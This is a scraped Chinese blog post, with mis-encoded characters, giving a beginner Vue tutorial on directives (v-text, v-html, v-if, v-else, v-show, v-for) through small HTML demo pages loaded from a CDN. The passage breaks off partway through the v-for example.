content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GUIRH"/> <meta itemprop="url" content="https://juejin.cn/user/1258279294208109"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VueæŒ‡ä»¤
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1258279294208109/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GUIRH
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:37:51.000Z" title="Thu Jan 08 2026 02:37:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä»¥ä¸‹å†…å®¹å‚è€ƒç¨‹åºå‘˜åä¸‰çš„Vue3+spring Bootå¤§å‹å‰åç«¯åˆ†ç¦»é¡¹ç›®å®æˆ˜</p>
<h2 data-id="heading-0">å‡†å¤‡å·¥ä½œ</h2>
<p>å­¦ä¹ ä¸€é—¨æ–°çš„æ¡†æ¶è¯­è¨€ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæœ€å¥½çš„æ–¹å¼å°±æ˜¯å»å®ƒçš„å®˜ç½‘æŠŠç›¸åº”çš„ç”Ÿå‘½å‘¨æœŸä»¥åŠ API éƒ½ç”¨ Demo çš„å½¢å¼å®æ“ä¸€éã€‚é‚£ä¹ˆæœ¬è¯¾ç¨‹ä¹Ÿä¸ä¾‹å¤–ï¼Œå¸¦å¤§å®¶ç®€å•äº†è§£ä¸€ä¸‹ Vue çš„æŒ‡ä»¤å’Œç”Ÿå‘½å‘¨æœŸï¼Œç­‰å®æˆ˜ç¯èŠ‚çš„æ—¶å€™ï¼Œä¼šè®²è§£çš„æ›´åŠ ç»†è‡´ä¸€äº›ã€‚</p>
<p>é¦–å…ˆè¿™é‡Œè®²è§£ Vue çš„ä¸¤ç§ä½¿ç”¨å½¢å¼ã€‚ç¬¬ä¸€ç§æ˜¯ç›´æ¥æŠŠ Vue é™æ€æ–‡ä»¶å¼•å…¥ script æ ‡ç­¾ï¼›ç¬¬äºŒç§æ˜¯é€šè¿‡åŒ…å®‰è£…çš„å½¢å¼ï¼Œä¸‹è½½åˆ° package.json é¡¹ç›®ä¸­ã€‚è¿™é‡Œæ–¹ä¾¿èµ·è§ï¼Œæˆ‘ä»¬é‡‡ç”¨ç¬¬ä¸€ç§å½¢å¼ã€‚</p>
<h4 data-id="heading-1">Live Server</h4>
<p>åœ¨ VS Code æ’ä»¶ç¯‡æˆ‘ä»¬æè¿‡Â <code>Live Server</code>æ’ä»¶ï¼Œå®ƒçš„ä½œç”¨æ˜¯åœ¨ä¿å­˜æ–‡ä»¶æ—¶è‡ªåŠ¨åˆ·æ–°é¡µé¢ã€‚æˆ‘ä»¬ä¸å¦¨æ¥å¤ä¹ ä¸€ä¸‹ä½¿ç”¨æ–¹æ³•ã€‚</p>
<p>1ã€å®‰è£… Live Server</p>
<p>2ã€æ‰“å¼€ VS Code ç¼–è¾‘å™¨ï¼Œåˆ›å»º VueDemo æ–‡ä»¶å¤¹ï¼Œæ–°å»ºä¸€ä¸ª index.html æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  ä½ å¥½ï¼Œæˆ‘æ˜¯åä¸‰
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>3ã€ç‚¹å‡»ç¼–è¾‘å™¨å³ä¸‹è§’ ã€ŒGo Liveã€</p>
<p>4ã€æµè§ˆå™¨è‡ªåŠ¨å”¤èµ·ï¼Œå±•ç¤ºé¡µé¢ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a8a8b7f8d7948b4b67007f95f7110bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=PFO90s2QsFINIphlykGOWVLiJEc%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-2">BootCDN</h4>
<p>å®‰åˆ©ä¸€ä¸ªé™æ€èµ„æºé›†åˆç½‘ç«™ â€”Â <a href="https://link.juejin.cn/?target=https%3A%2F%2Fwww.bootcdn.cn%2F" title="https://link.juejin.cn/?target=https%3A%2F%2Fwww.bootcdn.cn%2F" target="_blank">BootCDN</a>Â ï¼Œè¿™ä¸ªç½‘ç«™é›†å„å¤§ä¼˜ç§€å¼€æºåº“ä»£ç äºä¸€èº«ï¼Œç‚¹å‡»å¤åˆ¶ Vue çš„é™æ€èµ„æºÂ <a href="https://link.juejin.cn/?target=https%3A%2F%2Fcdn.bootcss.com%2Fvue%2F2.6.10%2Fvue.min.js" title="https://link.juejin.cn/?target=https%3A%2F%2Fcdn.bootcss.com%2Fvue%2F2.6.10%2Fvue.min.js" target="_blank">é“¾æ¥</a>ï¼Œåœ¨ VueDemo æ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªæ–‡ä»¶ demo1.htmlã€‚</p>
<p>new ä¸€ä¸ª Vue å®ä¾‹ï¼Œå°† id ä¸º app çš„ div æ ‡ç­¾ç»‘å®šåœ¨ el å±æ€§ä¸Šï¼Œè¿™ä¸ªå®ä¾‹çš„ä½œç”¨åŸŸå°±æ˜¯ id ä¸º app çš„æ ‡ç­¾å†…ï¼Œ data å±æ€§æ”¾ç½®ç›¸åº”çš„å˜é‡å‚æ•°ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹å­¦ä¹  Vue çš„ç”Ÿå‘½å‘¨æœŸåŠå„ä¸ªå±æ€§æŒ‡ä»¤ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">"text"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">text</span>: <span class="hljs-string">'å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯åä¸‰'</span>
      },
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>æ‰“å¼€ 127.0.0.1:5500/VueDemo/demo1.html å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¯´æ˜ Vue å¼•å…¥æˆåŠŸã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3df13b979a974861aaeb9b4ede940094~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=q2GgfM1CjXF%2FkaY6gr8LmE1ggx8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">å¼€å¯ Vue ä¹‹æ—…</h2>
<h4 data-id="heading-4">v-text &amp;&amp; v-html</h4>
<ul>
<li><strong>ç›¸åŒç‚¹</strong></li>
</ul>
<p>éƒ½èƒ½å±•ç¤ºæ•°æ®ï¼Œä¸”å±äºå•å‘ç»‘å®šã€‚å³æ•°æ®çš„å˜åŒ–ä¼šå½±å“æ’å€¼çš„å˜åŒ–ï¼Œè€Œæ’å€¼çš„å˜åŒ–ï¼Œä¸ä¼šå½±å“æ•°æ®çš„å˜åŒ–ã€‚å…¶å®Â <code>v-text</code>Â ä¹Ÿå¯ä»¥ç®€å†™ä¸ºÂ <code>{{ }}</code>Â ã€‚</p>
<ul>
<li><strong>ä¸åŒç‚¹</strong></li>
</ul>
<p>v-textï¼šåªèƒ½æ¸²æŸ“çº¯æ–‡æœ¬ï¼Œæµè§ˆå™¨ä¸ä¼šå¯¹å…¶è¿›è¡Œ html è§£æ</p>
<p>v-htmlï¼šç”¨äºè¾“å‡º htmlï¼Œæµè§ˆå™¨ä¼šè§£æ html</p>
<p>ä¸‹é¢é€šè¿‡ä»£ç å®ä¾‹æ¥éªŒè¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml">// demo1.htmnl
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ text }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{{ html }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">"text"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">"html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">"html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">text</span>: <span class="hljs-string">'å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯åä¸‰'</span>,
        <span class="hljs-attr">html</span>: <span class="hljs-string">'&lt;strong&gt;å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å£®å£®çš„åä¸‰&lt;/strong&gt;'</span>
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d26e7ef2d2d44ef799ced2043e4d642c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=DRyX%2B57y2WBoJds5ifN6cPkZtLw%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-5">v-ifã€v-else &amp;&amp; v-show</h4>
<ul>
<li><strong>ç›¸åŒç‚¹</strong></li>
</ul>
<p>é€šè¿‡å˜é‡æ§åˆ¶æ ‡ç­¾å†…å®¹çš„æ˜¾ç¤ºæˆ–éšè—ã€‚</p>
<ul>
<li><strong>ä¸åŒç‚¹</strong></li>
</ul>
<p><code>v-if</code>Â åœ¨æµè§ˆå™¨ä¸Šè¡¨ç°ä¸ºæ•´ä¸ª DOM èŠ‚ç‚¹ä¸ä¼šè¢«æ¸²æŸ“ï¼›</p>
<p><code>v-show</code>Â çš„å‘ˆç°å½¢å¼ç›¸å½“äºç»™ DOM èŠ‚ç‚¹æ·»åŠ äº†ä¸€ä¸ª CSS å±æ€§ â€”Â <code>display: none</code>Â ï¼›</p>
<p><code>v-else</code>Â åˆ™ç±»ä¼¼ JS è¯­æ³•çš„Â <code>if else</code>Â åˆ¤æ–­è¯­å¥ï¼Œéœ€è¦ç´§è·Ÿåœ¨Â <code>v-if</code>Â åé¢ã€‚</p>
<p>ä¸‹é¢é€šè¿‡ä»£ç å®ä¾‹æ¥éªŒè¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Vue Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">'app'</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isShow"</span>&gt;</span>æˆ‘æ˜¯åä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-else</span>&gt;</span>æˆ‘æ˜¯åå››<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"!isShow"</span>&gt;</span>æˆ‘æ˜¯åä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-else</span>&gt;</span>æˆ‘æ˜¯åå››<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">v-show</span>=<span class="hljs-string">"!isShow"</span>&gt;</span>æˆ‘æ˜¯æ¶ˆå¤±çš„åä¸‰<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcss.com/vue/2.6.10/vue.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">onload</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>({
      <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,
      <span class="hljs-attr">data</span>:{
        <span class="hljs-attr">isShow</span>: <span class="hljs-literal">true</span>,
      }
    })
  }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/741eaa072f734c448f0a19f848292f1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgR1VJUkg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444671&amp;x-signature=n9bSeWJAwpIPawalCgJ9v2UEsvc%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>â€œæˆ‘æ˜¯æ¶ˆå¤±çš„åä¸‰â€ ä½¿ç”¨çš„æ˜¯Â <code>v-show</code>Â çš„å½¢å¼éšè—äº† DOM èŠ‚ç‚¹ï¼Œæ­£å¦‚ä¸Šè¿°æ‰€ç¤ºï¼Œp æ ‡ç­¾è¢«æ·»åŠ äº†ä¸€ä¸ªÂ <code>display: none</code>Â CSS å±æ€§ã€‚è€Œä¸Šé¢ä¸¤ä¸ª p æ ‡ç­¾åœ¨æµè§ˆå™¨é‡Œ DOM èŠ‚ç‚¹å¹¶æ²¡æœ‰è¢«æ¸²æŸ“å‡ºæ¥ã€‚</p>
</blockquote>
<h4 data-id="heading-6">v-for</h4>
<p>v-for æŒ‡ä»¤è§£å†³çš„æ˜¯æ¨¡æ¿å¾ªç¯æ¸²æŸ“é—®é¢˜ï¼Œæ²¡æœ‰ Vueã€Reactç­‰æ¡†æ¶ä¹‹å‰éƒ½æ˜¯é€šè¿‡ for å¾ªç¯æ‹¼æ¥å­—ç¬¦ä¸²çš„å½¢å¼ï¼Œé€šè¿‡ append å°†æ‹¼æ¥å¥½çš„èŠ‚ç‚¹å¡å…¥æŒ‡å®šçš„ DOM èŠ‚ç‚¹ã€‚ç°åœ¨æœ‰äº†Â <code>v-for</code>Â æŒ‡ä»¤ï¼Œå°±ä¸ç”¨è¿™ä¹ˆéº»çƒ¦äº†ï¼Œå¾—åˆ°æ•°ç»„ä¹‹åï¼Œåªéœ€ä»¥Â <code>(item, index) in array</code>Â çš„å½¢å¼æ¸²æŸ“æ•°æ®ã€‚</p>
<p>ä¸‹é¢æ˜¯ä»£ç æ¼”ç¤ºï¼š</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"en"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">"X-UA-Compatible"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"ie=edge"</span>&gt;</span>
